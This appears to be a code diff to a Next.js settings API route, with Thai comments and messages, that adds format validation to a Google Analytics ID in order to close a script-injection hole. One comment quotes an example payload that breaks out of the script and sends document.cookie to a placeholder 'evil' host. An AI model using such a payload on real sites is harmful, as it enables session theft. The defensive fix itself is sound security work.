@@ -43,6 +43,13 @@ export async function PATCH(request: NextRequest) {
 
     if (!siteTitle?.trim()) return apiError("กรุณากรอกชื่อเว็บไซต์")
 
+    // ค่านี้ถูกแทรกลงใน <Script> ของ layout ตรงๆ ถ้าไม่จำกัดรูปแบบ
+    // สตริงอย่าง X'); fetch('//evil/'+document.cookie); // จะรันบนทุกหน้า
+    const gaId = googleAnalyticsId?.trim() || null
+    if (gaId && !/^(G|UA|GTM)-[A-Z0-9-]+$/i.test(gaId)) {
+      return apiError("รหัส Google Analytics ไม่ถูกต้อง (เช่น G-XXXXXXXXXX)")
+    }
+
     const current = await getOrCreateSettings()
 
     const settings = await prisma.seoSettings.update({
@@ -51,7 +58,7 @@ export async function PATCH(request: NextRequest) {
         siteTitle: siteTitle.trim(),
         siteDescription: siteDescription?.trim() || null,
         ogImage: ogImage || null,
-        googleAnalyticsId: googleAnalyticsId?.trim() || null,
+        googleAnalyticsId: gaId,
       },
     })
 
